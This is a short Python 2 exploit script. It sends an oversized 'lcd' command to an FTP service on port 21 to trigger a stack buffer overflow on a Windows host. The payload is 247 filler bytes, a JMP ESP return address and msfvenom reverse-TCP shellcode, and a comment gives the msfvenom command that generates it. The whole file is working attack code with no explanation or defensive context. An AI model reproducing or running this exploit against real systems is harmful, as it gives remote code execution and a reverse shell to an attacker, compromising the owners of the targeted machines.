#!/usr/bin/env python2
# nighter@nighter.se ( Mikael Kall )
import sys, socket, struct

#msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.1.xx LPORT=4444 -b '\x00\x0a\x0d' -f python -v shellcode
shellcode =  "\x90" * 10
shellcode += "\xbe\x29\xfa\xc9\x04\xd9\xc6\xd9\x74\x24\xf4"
shellcode += "\x58\x2b\xc9\xb1\x52\x31\x70\x12\x83\xe8\xfc"
shellcode += "\x03\x59\xf4\x2b\xf1\x65\xe0\x2e\xfa\x95\xf1"
shellcode += "\x4e\x72\x70\xc0\x4e\xe0\xf1\x73\x7f\x62\x57"
shellcode += "\x78\xf4\x26\x43\x0b\x78\xef\x64\xbc\x37\xc9"
shellcode += "\x4b\x3d\x6b\x29\xca\xbd\x76\x7e\x2c\xff\xb8"
shellcode += "\x73\x2d\x38\xa4\x7e\x7f\x91\xa2\x2d\x6f\x96"
shellcode += "\xff\xed\x04\xe4\xee\x75\xf9\xbd\x11\x57\xac"
shellcode += "\xb6\x4b\x77\x4f\x1a\xe0\x3e\x57\x7f\xcd\x89"
shellcode += "\xec\x4b\xb9\x0b\x24\x82\x42\xa7\x09\x2a\xb1"
shellcode += "\xb9\x4e\x8d\x2a\xcc\xa6\xed\xd7\xd7\x7d\x8f"
shellcode += "\x03\x5d\x65\x37\xc7\xc5\x41\xc9\x04\x93\x02"
shellcode += "\xc5\xe1\xd7\x4c\xca\xf4\x34\xe7\xf6\x7d\xbb"
shellcode += "\x27\x7f\xc5\x98\xe3\xdb\x9d\x81\xb2\x81\x70"
shellcode += "\xbd\xa4\x69\x2c\x1b\xaf\x84\x39\x16\xf2\xc0"
shellcode += "\x8e\x1b\x0c\x11\x99\x2c\x7f\x23\x06\x87\x17"
shellcode += "\x0f\xcf\x01\xe0\x70\xfa\xf6\x7e\x8f\x05\x07"
shellcode += "\x57\x54\x51\x57\xcf\x7d\xda\x3c\x0f\x81\x0f"
shellcode += "\x92\x5f\x2d\xe0\x53\x0f\x8d\x50\x3c\x45\x02"
shellcode += "\x8e\x5c\x66\xc8\xa7\xf7\x9d\x9b\x07\xaf\x9c"
shellcode += "\x4d\xe0\xb2\x9e\x60\xac\x3b\x78\xe8\x5c\x6a"
shellcode += "\xd3\x85\xc5\x37\xaf\x34\x09\xe2\xca\x77\x81"
shellcode += "\x01\x2b\x39\x62\x6f\x3f\xae\x82\x3a\x1d\x79"
shellcode += "\x9c\x90\x09\xe5\x0f\x7f\xc9\x60\x2c\x28\x9e"
shellcode += "\x25\x82\x21\x4a\xd8\xbd\x9b\x68\x21\x5b\xe3"
shellcode += "\x28\xfe\x98\xea\xb1\x73\xa4\xc8\xa1\x4d\x25"
shellcode += "\x55\x95\x01\x70\x03\x43\xe4\x2a\xe5\x3d\xbe"
shellcode += "\x81\xaf\xa9\x47\xea\x6f\xaf\x47\x27\x06\x4f"
shellcode += "\xf9\x9e\x5f\x70\x36\x77\x68\x09\x2a\xe7\x97"
shellcode += "\xc0\xee\x07\x7a\xc0\x1a\xa0\x23\x81\xa6\xad"
shellcode += "\xd3\x7c\xe4\xcb\x57\x74\x95\x2f\x47\xfd\x90"
shellcode += "\x74\xcf\xee\xe8\xe5\xba\x10\x5e\x05\xef"

jmp_esp = '\x4f\x31\x9d\x7c'
junk = 'B' * 8
buffer = 'A' * 247 + jmp_esp + junk + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.52',21))
s.recv(1024)
print('[*] Sending payload')
s.send('lcd ' + buffer + '\r\n')
s.close()
